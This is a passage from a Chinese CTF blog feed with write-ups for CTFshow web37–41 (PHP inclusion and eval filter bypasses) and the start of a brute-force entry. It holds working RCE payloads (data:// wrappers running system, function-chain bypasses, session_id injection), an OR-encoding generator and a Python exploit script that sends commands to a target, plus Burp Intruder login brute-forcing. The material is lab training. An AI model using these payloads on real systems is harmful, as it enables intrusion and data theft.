class="line">&#125;</span><br></pre></td></tr></table></figure><p>这回直接给你include，文件包含，不让出现flag字段，上来先想到data伪协议。<br>upload：<code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs+</code><br>其中<code>PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs+</code>是：<code>&lt;?php system(&quot;tac flag.php&quot;);&gt;</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678719387328-7c2f4056-1b4c-4999-9290-945a41c4ce13.png" alt="image.png"></p><h2 id="复习一下data伪协议的用法："><a href="#复习一下data伪协议的用法：" class="headerlink" title="复习一下data伪协议的用法："></a>复习一下data伪协议的用法：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、data:<span class="comment">//text/plain,</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="number">2</span>、data:<span class="comment">//text/plain;base64,</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span><br></pre></td></tr></table></figure><h1 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续使用上一题upload即可：<code>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs+</code></p><h1 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>upload：<code>?c=data://text/plain,&lt;?php system(&quot;tac f*&quot;);?&gt;//</code><br>题目在include后面强加了<code>.php</code>我们只需要在语句中添加<code>//</code>注释掉末尾的字段即可。<br>但事实上，这道题不用管也可以，去掉<code>//</code>也是没问题的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678720477364-6e7e2ec6-9a53-45d0-9550-05fa59a7a617.png" alt="image.png"></p><h1 id="web40-禁止套娃（有·东西）"><a href="#web40-禁止套娃（有·东西）" class="headerlink" title="web40 禁止套娃（有·东西）"></a>web40 禁止套娃（有·东西）</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="fuzz查看pregmatch剩余字符"><a href="#fuzz查看pregmatch剩余字符" class="headerlink" title="fuzz查看pregmatch剩余字符"></a>fuzz查看pregmatch剩余字符</h2><p>先fuzz一下剩下了哪些常用字符：（他看着过滤了括号，但实际上是中文里的括号。。。）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">33</span>; <span class="variable">$i</span> &lt;= <span class="number">126</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678722206004-f1d59aca-48dc-4732-a094-8bd2ad896196.png" alt="image.png"><br>看到结果思考了半天没有想法，看了看wp学到了新姿势：</p><h2 id="套娃解法"><a href="#套娃解法" class="headerlink" title="套娃解法"></a>套娃解法</h2><blockquote><p><a href="https://ctf.show/writeups/1002659">https://ctf.show/writeups/1002659</a><br><a href="https://blog.csdn.net/weixin_46250265/article/details/114266578">https://blog.csdn.net/weixin_46250265/article/details/114266578</a><br><a href="https://www.cnblogs.com/aninock/p/15125215.html">https://www.cnblogs.com/aninock/p/15125215.html</a></p></blockquote><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>来自题目下方的hint：<br>upload：<code>?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code><br>分析一下是什么意思，先解释一下其中的各个函数都是什么意思。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">localeconv</span>()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.)</span><br><span class="line"><span class="title function_ invoke__">scandir</span>()：获取目录下的文件，<span class="title function_ invoke__">scandir</span>(.)：获取当前目录下所有文件</span><br><span class="line"><span class="title function_ invoke__">pos</span>()：返回数组中的当前元素的值。</span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>()：数组逆序</span><br><span class="line"><span class="title function_ invoke__">next</span>()： 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>()：函数进行文件内容的读取，并输出</span><br></pre></td></tr></table></figure><p>var_dump一下localeconv()函数，第一个对应的值是<code>.</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678802966279-4fce3e4a-9652-4050-96bb-eabf4309afed.png" alt="image.png"><br>构造payload。首先是我们要输出列表下的所有文件：<br><code>print_r(scandir(&#39;.&#39;));</code>但是其中的点和单引号已经被过滤掉了，因此我们需要绕过一下，这就需要用到上面这个函数了（通过函数传参来获得）。所以想使用<code>localeconv()[&quot;decimal_point&quot;]</code>来获取到<code>.</code>但是双引号已经被过滤了。<br>这里有三个函数能够起到替代作用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>() 函数返回数组中的当前元素（单元）,默认取第一个值，</span><br><span class="line"><span class="title function_ invoke__">pos</span>() 同 <span class="title function_ invoke__">current</span>() ,是<span class="title function_ invoke__">current</span>()的别名</span><br><span class="line"><span class="title function_ invoke__">reset</span>() 函数返回数组第一个单元的值，如果数组为空则返回 <span class="literal">FALSE</span></span><br></pre></td></tr></table></figure><p>测试一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678803619659-b2d38fe5-349a-4625-bcc9-161167344e25.png" alt="image.png"><br>这时候payload已经初具规模了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678803689999-21e077e8-fcb2-43d7-a167-5d2f3d2a74e4.png" alt="image.png"><br>所以我们可以利用这段payload获取到当前文件夹的信息：<br><code>?c=var_dump(scandir(pos(localeconv())));</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678803871260-e3107088-3440-4dc7-a3ff-5ab5057ee454.png" alt="image.png"><br><em>当然这次是flag文件就在当前文件夹，如果不在当前文件夹需要使用：</em><code>_var_dump(scandir(&#39;../../&#39;));_</code><br>接下来的思路就是想办法获取到文件。我们可以使用<code>highlight_file()</code>函数（或者使用<code>show_source()</code>）来查看文件。然后就是索引，我们可以使用next、end函数等，以下为相关的方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">current</span>()返回数组中的当前元素的值。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">end</span>()将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">next</span>()将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">prev</span>()将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">reset</span>()将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">each</span>()返回当前元素的键名和键值，并将内部指针向前移动。</span><br></pre></td></tr></table></figure><p>但是flag文件不在头尾，所以我们可以使用array_reverse函数来倒转然后通过<code>next</code>函数来获取到文件。<br>至此payload就可以构建了：<code>c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code></p><h4 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h4><p>当然不可能只有这几个函数恰好能够满足条件。<br>比如说其中的pos函数可以被current、reset函数替换。<br>show_resource函数可以使用high_light函数来替换。<br>pos（localeconv（））的组合函数也可以被getcwd函数替换掉。（getcwd函数会返回当前所在文件夹）。</p><h3 id="方法二利用sessionid（好像不行）"><a href="#方法二利用sessionid（好像不行）" class="headerlink" title="方法二利用sessionid（好像不行）"></a>方法二利用sessionid（好像不行）</h3><p>利用sessionid来传参，但似乎传参也会被过滤，所以对这道题来说好像不太行…<br>upload：<code>?c=session_start();system(session_id());</code>，cookie修改为：<code>PHPSESSID=ls</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678806594280-0004a365-cdbd-46cd-b8b1-7691d0441e58.png" alt="image.png"></p><h3 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h3><p>首先是payload：<code>?c=eval(array_pop(next(get_defined_vars())));</code>除此之外需要用post传入<code>1=system(&#39;tac fl*&#39;);</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678807377877-48a49a97-d692-427b-b685-6132ebc2fd30.png" alt="image.png"><br>分析，先讲述一下各个函数的作用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">get_defined_vars</span>() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">next</span>()将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">array_pop</span>() 函数删除数组中的最后一个元素并返回其值。 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678807006608-006af0ef-a25d-4623-bfb9-bcb58b1c5b0b.png" alt="image.png"><br>payload的含义就是在post中寻找到对应木马，并运行。、</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这题真的有点东西，思路简单容易理解，但是难在如何找到返回这些需要参数的函数。</p><h1 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>查看一下剩余字符：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678884677705-956c818c-49fd-4272-8ebf-a47e532af942.png" alt="image.png"><br>把字符都过滤掉了，觉得应该是用什么方法来替代字符，但是之后就没有思路了。</p><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p></blockquote><p>看了wp，发现想法没问题。<br>题目中特意提到了，上来先考虑的是：<strong>异或自增和取反</strong>构造字符都无法使用，但是留下了<code>|</code><br>wp提供了两个脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;rce_or.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">    <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line"><span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">    <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><p>从进行异或的字符中排除掉被过滤的，然后在判断异或得到的字符是否为可见字符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;php rce_or.php&quot;</span>)  <span class="comment">#没有将php写入环境变量需手动运行</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(argv)!=<span class="number">2</span>):</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line">   exit(<span class="number">0</span>)</span><br><span class="line">url=argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;rce_or.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))</span><br><span class="line">   data=&#123;</span><br><span class="line">       <span class="string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)</span><br><span class="line">       &#125;</span><br><span class="line">   r=requests.post(url,data=data)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;\n[*] result:\n&quot;</span>+r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果没有将php写入环境变量，就需要先运行rce_or.php生成文本，将文本置于与exp.py相同目录下，运行exp.py<br>使用方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py 你的对应url</span><br></pre></td></tr></table></figure><p>然后分贝在function参数和command参数添加你需要的参数。<br>比如system和ls。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678886696210-9bd0695d-c936-4068-86ac-77249e2e12e5.png" alt="image.png"></p><h1 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h1><p>这部分题前面做着还算简单，直到40、41直接来了一个毁灭性打击。难度和前面的根本不是一个量级的。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web21-28爆破篇</title>
      <link href="/2023/03/13/web21-28%E7%88%86%E7%A0%B4%E7%AF%87/"/>
      <url>/2023/03/13/web21-28%E7%88%86%E7%A0%B4%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="相关文章及参考资料"><a href="#相关文章及参考资料" class="headerlink" title="相关文章及参考资料"></a>相关文章及参考资料</h1><blockquote><p><a href="https://www.cnblogs.com/meng-han/p/16053552.html"> 暴力破解(生成字典、爆破服务、爆破登录、解密、BurpSuite工具讲解) </a></p></blockquote><h1 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h1><p><del>做完了我才发现这些题的字典实在web21里面需要下载…</del></p><h1 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h1><blockquote><p>爆破什么的，都是基操</p></blockquote><blockquote><p>burpsuite爆破：<a href="https://www.cnblogs.com/007NBqaq/p/13220297.html">https://www.cnblogs.com/007NBqaq/p/13220297.html</a></p></blockquote><p>直接展示登陆界面，随便输点什么，抓包，可以发现把账号密码放在了请求头中，并且根据末尾的==可以看出是base64加密，因此我们直接尝试Intruder模块爆破。<br>原理我们都懂，但是我们该如何操作呢？</p><h2 id="方案一-burpsuite爆破"><a href="#方案一-burpsuite爆破" class="headerlink" title="方案一 burpsuite爆破"></a>方案一 burpsuite爆破</h2><p>将请求转入intruder，因为会拼接payload，所以使用基本的sniper类型就行，在payload sets里面修改payload tpe为<code>Custom Interator</code>，并且在payload option中按照顺序修改三个position。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726131628-7ca04364-333b-48e3-bdaf-bd5ff55d6c8f.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726143875-172fd7f8-7d60-4f5c-8d79-57aec5d46650.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726152940-8e723666-ba55-4d24-8e87-9123771ee382.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726186298-73d9efbc-8154-40c3-b2f0-2ffdbccf833a.png" alt="image.png"><br>而且我们观察可以注意到，我们还需要将payload使用base64加密，因此在payload processing里面添加转换：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726245072-04e6ff20-acd9-45aa-a639-db4e41b833f7.png" alt="image.png"><br>最后再将末尾的转义关闭。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677726288398-49c8a4bd-7ee2-4cb6-b38c-8c3cdb8614be.png" alt="image.png"><br>这种情况下爆破即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677727052915-6090cb47-a08f-4b1a-b670-0f34b353ce1d.png" alt="image.png"></p><h2 id="方案二-脚本爆破"><a href="#方案二-脚本爆破" class="headerlink" title="方案二 脚本爆破"></a>方案二 脚本爆破</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 